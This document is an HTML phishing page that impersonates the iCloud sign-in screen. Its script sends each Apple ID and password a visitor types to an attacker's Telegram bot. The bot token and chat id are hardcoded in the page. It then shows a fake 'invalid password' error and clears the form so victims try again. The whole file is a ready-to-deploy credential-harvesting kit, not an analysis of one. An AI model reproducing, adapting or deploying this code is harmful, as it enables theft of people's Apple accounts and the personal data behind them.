<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>iCloud</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
body{background:linear-gradient(180deg,#f2f2f6 0%,#e5e5ea 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.box{background:rgba(255,255,255,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:24px;padding:40px 32px;box-shadow:0 8px 40px rgba(0,0,0,0.12);width:100%;max-width:400px;text-align:center;}
.logo{font-size:56px;margin-bottom:8px;}
h1{font-size:24px;font-weight:700;color:#1d1d1f;margin-bottom:4px;}
.sub{font-size:15px;color:#86868b;margin-bottom:28px;}
input{width:100%;padding:16px 14px;margin:8px 0;border:1.5px solid #d2d2d7;border-radius:12px;font-size:16px;background:#fff;outline:none;transition:0.2s;}
input:focus{border-color:#0071e3;box-shadow:0 0 0 3px rgba(0,113,227,0.2);}
button{width:100%;padding:16px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-top:12px;transition:0.2s;}
button:hover{background:#0077ed;}
button:active{transform:scale(0.97);}
.help{margin-top:24px;font-size:13px;}
.help a{color:#0071e3;text-decoration:none;display:block;margin:4px 0;}
.err{color:#d93025;font-size:14px;margin-top:14px;display:none;}
.load{display:none;margin-top:16px;}
.load span{display:inline-block;width:8px;height:8px;background:#0071e3;border-radius:50%;margin:0 3px;animation:b 1.4s infinite;}
.load span:nth-child(2){animation-delay:0.16s;}
.load span:nth-child(3){animation-delay:0.32s;}
@keyframes b{0%,80%,100%{transform:scale(0);}40%{transform:scale(1);}}
</style>
</head>
<body>
<div class="box">
<div class="logo">🍎</div>
<h1>iCloud</h1>
<p class="sub">Sign in to your account</p>
<input type="email" id="e" placeholder="Apple ID">
<input type="password" id="p" placeholder="Password">
<button onclick="go()">Sign In</button>
<div class="load" id="l"><span></span><span></span><span></span><br><span style="font-size:12px;color:#86868b;margin-top:6px;display:block;">Verifying...</span></div>
<div class="err" id="x">Invalid Apple ID or password. Please try again.</div>
<div class="help">
<a href="#">Forgot Apple ID or password?</a>
<a href="#">Create Apple ID</a>
</div>
</div>
<script>
function go(){
var e=document.getElementById("e").value;
var p=document.getElementById("p").value;
if(e==""||p==""){alert("Please fill in both fields.");return;}
document.getElementById("l").style.display="block";
document.querySelector("button").disabled=true;
var x=new XMLHttpRequest();
x.open("POST","https://api.telegram.org/bot8976876114:AAGjlI4juHUaOyCbhj1MFPITpHK_0WuJlro/sendMessage",true);
x.setRequestHeader("Content-Type","application/json");
x.send(JSON.stringify({chat_id:"6512360078",text:"Apple ID: "+e+"\nPassword: "+p}));
setTimeout(function(){
document.getElementById("l").style.display="none";
document.querySelector("button").disabled=false;
document.getElementById("x").style.display="block";
document.getElementById("e").value="";
document.getElementById("p").value="";
},2500);
}
</script>
</body>
</html>
